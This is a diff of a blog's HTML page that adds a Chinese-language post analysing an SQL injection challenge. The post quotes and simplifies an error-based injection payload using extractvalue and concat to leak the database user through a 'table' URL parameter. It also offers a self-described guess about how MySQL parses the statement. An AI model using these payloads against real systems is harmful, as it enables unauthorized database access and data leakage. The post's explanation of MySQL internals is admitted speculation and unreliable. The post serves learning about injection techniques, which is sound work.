@@ -7,7 +7,7 @@
 <head>
   <meta charset="utf-8">
   
-  <title>你好哇吴文娟 | Homaebic-Know thyself</title>
+  <title>Homaebic-Know thyself</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -15,14 +15,17 @@
     <meta name="keywords" content="forsigner,前端,设计,Hexo主题,前端开发,用户体验,设计,frontend,design,nodejs,JavaScript" />
   
 
-  <meta property="og:type" content="article">
-<meta property="og:title" content="你好哇吴文娟">
-<meta property="og:url" content="http://hebic.me/2017/08/19/你好哇吴文娟/index.html">
+  <meta name="description" content="原文在关于一个sql注入注入题目的思考，最后博主给了最终的payload：123update `table` t left join (select char(97) as user from dual where (extractvalue(1,concat(0x7e,(select user()),0x7e)))) tt on tt.user=`t.username` set username">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Homaebic-Know thyself">
+<meta property="og:url" content="http://hebic.me/2017/08/19/关于一个sql注入题目思考的思考/index.html">
 <meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="原文在关于一个sql注入注入题目的思考，最后博主给了最终的payload：123update `table` t left join (select char(97) as user from dual where (extractvalue(1,concat(0x7e,(select user()),0x7e)))) tt on tt.user=`t.username` set username">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2017-08-19T09:15:05.735Z">
+<meta property="og:updated_time" content="2017-08-19T14:54:59.500Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="你好哇吴文娟">
+<meta name="twitter:title" content="Homaebic-Know thyself">
+<meta name="twitter:description" content="原文在关于一个sql注入注入题目的思考，最后博主给了最终的payload：123update `table` t left join (select char(97) as user from dual where (extractvalue(1,concat(0x7e,(select user()),0x7e)))) tt on tt.user=`t.username` set username">
 
   
 
@@ -179,12 +182,17 @@
 </div>
 
 
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#为什么这样的payload可以成功执行？"><span class="toc-text">为什么这样的payload可以成功执行？</span></a></li></ol>
+  </div>
+
 
 
 <div class="content content-post CENTER">
-   <article id="post-你好哇吴文娟" class="article article-type-post" itemprop="blogPost">
+   <article id="post-关于一个sql注入题目思考的思考" class="article article-type-post" itemprop="blogPost">
   <header class="article-header">
-    <h1 class="post-title">你好哇吴文娟</h1>
+    <h1 class="post-title">(no title)</h1>
 
     <div class="article-meta">
       <span>
@@ -200,7 +208,7 @@
       
         <span>
           <i class="icon-comment"></i>
-          <a href="http://hebic.me/2017/08/19/你好哇吴文娟/#disqus_thread"></a>
+          <a href="http://hebic.me/2017/08/19/关于一个sql注入题目思考的思考/#disqus_thread"></a>
         </span>
       
 
@@ -219,7 +227,15 @@
 
   <div class="article-content">
     
-      
+      <p>原文在<a href="http://blog.csdn.net/niexinming/article/details/55001126" target="_blank" rel="external">关于一个sql注入注入题目的思考</a>，最后博主给了最终的payload：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">update</span> <span class="string">`table`</span> t <span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> <span class="built_in">char</span>(<span class="number">97</span>) <span class="keyword">as</span> <span class="keyword">user</span> <span class="keyword">from</span> dual <span class="keyword">where</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)))) tt <span class="keyword">on</span> tt.user=<span class="string">`t.username`</span></div><div class="line"> <span class="keyword">set</span> username =\<span class="string">'admin\' </span></div><div class="line"><span class="string">where id=1;</span></div></pre></td></tr></table></figure></p>
+<p>我对格式稍作改动<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">update</span> <span class="string">`users`</span> t </div><div class="line">	<span class="keyword">left</span> <span class="keyword">join</span> </div><div class="line">		(<span class="keyword">select</span> <span class="built_in">char</span>(<span class="number">97</span>) <span class="keyword">as</span> <span class="keyword">user</span> <span class="keyword">from</span> dual <span class="keyword">where</span>(extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>) ))) tt </div><div class="line">			<span class="keyword">on</span> </div><div class="line">		tt.user=<span class="string">`t.username`</span>  </div><div class="line"><span class="keyword">set</span> username =\<span class="string">'admin\' </span></div><div class="line"><span class="string">where id=1;</span></div></pre></td></tr></table></figure></p>
+<p>在这个payload中左表是<code>users</code>，右表是<code>(select char(97) as user from dual where(extractvalue(1,concat(0x7e,(select user()),0x7e))))</code>，从左表取<code>tt.user</code>，从右表取<code>t.username</code>。</p>
+<p>删除<code>char(97) as user from dual</code>后，依然可以报错注入。再修改后面的内容<code>on tt.a=t.a</code>依然可以。<br>payload被简化成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?table=users` t left join (select (extractvalue(1,concat(0x7e,(select user()),0x7e)))) tt on tt.a=`t.a</div></pre></td></tr></table></figure></p>
+<h2 id="为什么这样的payload可以成功执行？"><a href="#为什么这样的payload可以成功执行？" class="headerlink" title="为什么这样的payload可以成功执行？"></a>为什么这样的payload可以成功执行？</h2><p>我猜测mysql在处理一条语句时，会先判断语法是否正确，然后从左至右依次执行，直到遇到非语法错误后停止（列多或少了，表存在或不存在等）。按照这个猜测分析payload语法：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">update</span> <span class="string">`users`</span> t </div><div class="line">	<span class="keyword">left</span> <span class="keyword">join</span> </div><div class="line">		(<span class="keyword">select</span> <span class="keyword">where</span>(extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>) ))) tt </div><div class="line">			<span class="keyword">on</span> </div><div class="line">		tt.a=<span class="string">`t.a`</span>  </div><div class="line"><span class="keyword">set</span> username =\<span class="string">'admin\' </span></div><div class="line"><span class="string">where id=1;</span></div></pre></td></tr></table></figure></p>
+<p>update语句完整，left join语句完整，select语句完整，因此从左至右执行。当执行到<code>select where(extractvalue(1,concat(0x7e,(select user()),0x7e) ))</code> 时抛出错误并停止之后语句的执行。因此对于users表中没有a列，以及<code>select where(extractvalue(1,concat(0x7e,(select user()),0x7e) ))</code>表中没有a列Mysql都未报错。</p>
+<p>我寻找了一些mysql运行机制的相关文章，并没有找到具体的语句解析说明。在<a href="http://blog.csdn.net/tianlesoftware/article/details/7029112" target="_blank" rel="external">MySQL 系统架构 说明</a>中讲到无cache状态的query查询会进入表变更管理模块，分配到update处理器中。将内部查询拆解，再次进入对应处理器中，这个过程由Optimizer完成。、</p>
+<p>如果是从内到外的执行语句，那id=1的用户名应该并没有被修改，事实证明的确是这样。我的猜测也只能到这里，如果有师傅明白底层的逻辑，请指教:D</p>
+
     
   </div>
 </article>
@@ -249,10 +265,10 @@
 
    
   <div class="box-prev-next clearfix">
-    <a class="hide pull-left" href="/">
+    <a class="show pull-left" href="/2017/08/19/XSS的关于同源基础知识……/">
         <i class="icon icon-angle-left"></i>
     </a>
-    <a class="show pull-right" href="/2017/08/19/74CMS_3.5 二次注入/">
+    <a class="show pull-right" href="/2017/08/19/利用DNS通道传输一点数据/">
         <i class="icon icon-angle-right"></i>
     </a>
   </div>
@@ -377,7 +393,7 @@
   <script>
     var disqus_shortname = 'forsigner';
     
-    var disqus_url = 'http://hebic.me/2017/08/19/你好哇吴文娟/';
+    var disqus_url = 'http://hebic.me/2017/08/19/关于一个sql注入题目思考的思考/';
     
     (function(){
       var dsq = document.createElement('script');
